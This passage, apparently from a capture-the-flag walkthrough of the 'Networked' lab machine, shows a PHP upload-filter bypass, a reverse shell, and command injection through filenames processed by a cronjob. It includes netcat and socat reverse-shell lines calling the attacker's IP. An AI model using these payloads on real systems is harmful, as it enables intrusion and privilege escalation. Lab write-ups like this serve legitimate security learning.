+      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;function_exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'finfo_file'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;$finfo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;finfo_open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;FILEINFO_MIME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;is_resource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$finfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// It is possible that a FALSE value is returned, if there is no magic MIME database file found on the system&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+          &lt;span class=&quot;nv&quot;&gt;$mime&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;finfo_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$finfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'tmp_name'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+          &lt;span class=&quot;nb&quot;&gt;finfo_close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$finfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+          &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;is_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$mime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;preg_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$regexp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$mime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$matches&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;nv&quot;&gt;$file_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$matches&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$file_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;(Above is only part of the function.) If our file matches on the regex in the second line, it should pass this as well.&lt;/p&gt;
+
+&lt;p&gt;I head over to regex101.com, enter in the regex, and manipulate my filename in line with some common upload bypasses. I remember to keep “.png” at the end, so that it passes the first snippet of code I mentioned.&lt;/p&gt;
+
+&lt;p&gt;Here’s one that appears to work:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/networked/image7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;performing-the-bypass&quot;&gt;Performing the bypass&lt;/h1&gt;
+
+&lt;p&gt;First, let’s test if we can even include PHP code in our test PNG file. Then, we’ll manipulate the file name so that we can trigger our payload as a file with the .php extension.&lt;/p&gt;
+
+&lt;p&gt;I intercept my normal file upload with Burp. The filename, Content-Type, and content itself look like this.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/networked/image8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So I create a PHP reverse shell (using the one in webshells) and paste it right after my PNG content ends.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/networked/image9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I forward the request, and my upload succeeds.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/networked/image3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This means that the upload does no checks to see if there’s any PHP code in the image. (It may check for “magic bytes” in the beginning of the file, which is why I was careful to preserve the PNG and add the PHP _after_the PNG content.)&lt;/p&gt;
+
+&lt;p&gt;To execute the code, we need the file to have the .php extension, not .png, so I send the upload again with the PHP code–but I also modify the filename like this:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/networked/image10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As with before, it succeeds.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/networked/image3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I set up my netcat listener:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~/HTB/Networked# nc -nlvp 443
+listening on [any] 443 ...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Then I visit /photos.php to trigger the payload. We see our filename on the page, but no image.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/networked/image11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Back on my listener, I get a shell as user Apache.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~/HTB/Networked# nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.14.27] from (UNKNOWN) [10.10.10.146] 57646
+Linux networked.htb 3.10.0-957.21.3.el7.x86_64 #1 SMP Tue Jun 18 16:35:19 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 02:54:28 up  2:45,  0 users,  load average: 0.00, 0.01, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=48(apache) gid=48(apache) groups=48(apache)
+sh: no job control in this shell
+sh-4.2$ &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;I upgrade to a Python TTY to make life easier:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;sh-4.2$ python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h1 id=&quot;analyzing-the-cronjob&quot;&gt;Analyzing the cronjob&lt;/h1&gt;
+
+&lt;p&gt;In the user guly’s home folder, we find:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;User.txt – with no permission to read&lt;/li&gt;
+  &lt;li&gt;check_attack.php – a script that checks if filenames have been modified and alerts the user guly&lt;/li&gt;
+  &lt;li&gt;crontab.guly – a cronjob that executes check_attack.php every 3 minutes. We can assume this is under the context of user guly, given the filename and location.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;bash-4.2$ cat crontab.guly
+*/3 * * * * php /home/guly/check_attack.php&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Let’s see what check_attack.php does (comments mine).&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Invoking functions from lib.php&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/var/www/html/lib.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Setting up variables, including fields for an e-mail&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/var/www/html/uploads/'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$logpath&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/tmp/attack.log'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$to&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'guly'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$msg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$headers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;X-Mailer: check_attack.php&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Below will scan all files in /var/www/html/uploads and place them in the $files array.&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$files&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$files&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;preg_grep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/^([^.])/'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;scandir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;foreach&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$files&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;$msg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'index.html'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Ensuring that all filenames are a valid IP address.&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# The check_ip function is found in lib.php.&lt;/span&gt;
+
+  &lt;span class=&quot;k&quot;&gt;list&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getnameCheck&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;nv&quot;&gt;$check&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;check_ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# If the filename is not an IP address, echo &quot;attack!&quot;&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# and place the file contents in the e-mail message.&lt;/span&gt;
+
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;attack!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;file_put_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$logpath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;FILE_APPEND&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;LOCK_EX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                                       
+
+	&lt;span class=&quot;c1&quot;&gt;# Delete the file.&lt;/span&gt;
+
+    &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rm -f &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$logpath&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;nohup /bin/rm -f &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$path$value&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 &amp;amp;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                                        
+    &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;rm -f &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$path$value&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    
+    &lt;span class=&quot;c1&quot;&gt;# Mail the file to guly.&lt;/span&gt;
+    
+    &lt;span class=&quot;nb&quot;&gt;mail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$to&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;-F&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$value&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Ideally, we’d want the script to give us a shell, but we can’t modify the script. What we can modify, however, are filenames in the uploads folder–which are part of this script.&lt;/p&gt;
+
+&lt;h1 id=&quot;command-execution-for-guly&quot;&gt;Command execution for guly&lt;/h1&gt;
+
+&lt;p&gt;The variable we have control over is &lt;code class=&quot;highlighter-rouge&quot;&gt;$value&lt;/code&gt;. If we add or rename a file in /var/www/html/uploads, we can insert our own input into the script. But it’s tough to know exactly where in the script this would be effective. Luckily, we can get an idea of what’s going on with the “echo” commands throughout. And we can test executing the PHP as Apache to see if we’re getting the right results–before we let the cronjob (i.e., user guly) execute it.&lt;/p&gt;
+
+&lt;p&gt;First, I create a test file (test.txt), drop it in the uploads folder, and run the PHP script.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;bash-4.2$ cd /var/www/html/uploads
+cd /var/www/html/uploads
+bash-4.2$ touch &quot;test.txt&quot;
+touch &quot;test.txt&quot;
+bash-4.2$ php /home/guly/check_attack.php
+php /home/guly/check_attack.php
+attack!
+rm -f /var/www/html/uploads/test.txt&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;So the filename ($value) appends to the end of “rm -f /var/www/html/uploads”. In the script, the actual code we’re manipulating is:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;nohup /bin/rm -f &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$path$value&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 &amp;amp;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                                        &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;If we can add a filename that starts with a semicolon and continues with a command, we could add an entirely new command for php exec() to run.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;nohup /bin/rm -f &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$path&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;; command-to-inject; &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 &amp;amp;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                                        &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h1 id=&quot;the-right-reverse-shell&quot;&gt;The right reverse shell&lt;/h1&gt;
+
+&lt;p&gt;I had trouble getting netcat to work here. First because of the slashes…&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;bash-4.2$ touch &quot;; nc 10.10.14.27 4444 -e '/bin/bash'&quot;
+touch: cannot touch '; nc 10.10.14.27 4444 -e \'/bin/bash\'': No such file or directory&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;So I looked to other shells, like socat. I set up my listener on Kali:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~# socat file:`tty`,raw,echo=0 tcp-listen:4444&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Then I create my filename that somehow allows all these punctuation marks (as long as they aren’t slashes).&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;bash-4.2$ touch &quot;; socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.27:4444&quot; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;And I execute the attack as user apache:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;bash-4.2$ php /home/guly/check_attack.php
+attack!
+nohup: ignoring input and redirecting stderr to stdout
+rm -f /var/www/html/uploads/; socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.27:4444&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;And I get a shell as apache on my listener. So the test worked.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~# socat file:`tty`,raw,echo=0 tcp-listen:4444
+bash-4.2$ whoami
+apache&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;So now for the real deal. On my attacking machine, I kill the second apache shell and create a new socat listener. On the victim machine, I create that socat payload filename. But instead of executing it, I wait for the cronjob to execute as user guly. Within 3 minutes, I have a shell as guly:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~# socat file:`tty`,raw,echo=0 tcp-listen:4444  
+[guly@networked ~]$ &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;And here’s user.txt.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;[guly@networked ~]$ cat user.txt
+526c############################&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h1 id=&quot;another-exploitable-script&quot;&gt;Another exploitable script&lt;/h1&gt;
+
+&lt;p&gt;What I love about this box is that everything revolves around finding flaws through code review. As we find through &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt; (which shows everything guly is allowed to run as root), we have another exploitable script to play with.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;[guly@networked /]$ sudo -l
+&amp;lt;--- snip ---&amp;gt;
+User guly may run the following commands on networked:
+    (root) NOPASSWD: /usr/local/sbin/changename.sh&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;This is changename.sh:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash -p&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /etc/sysconfig/network-scripts/ifcfg-guly &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;EoF&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;
+DEVICE=guly0
+ONBOOT=no
+NM_CONTROLLED=no
+&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EoF
+
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;regexp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;^[a-zA-Z0-9_&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/-]+$&quot;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;var &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
+        &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;interface &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;:&quot;&lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;x
+        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;~ &lt;span class=&quot;nv&quot;&gt;$regexp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
+                &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;wrong input, try again&quot;&lt;/span&gt;
+                &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;interface &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;:&quot;&lt;/span&gt;
+                &lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;x
+        &lt;span class=&quot;k&quot;&gt;done
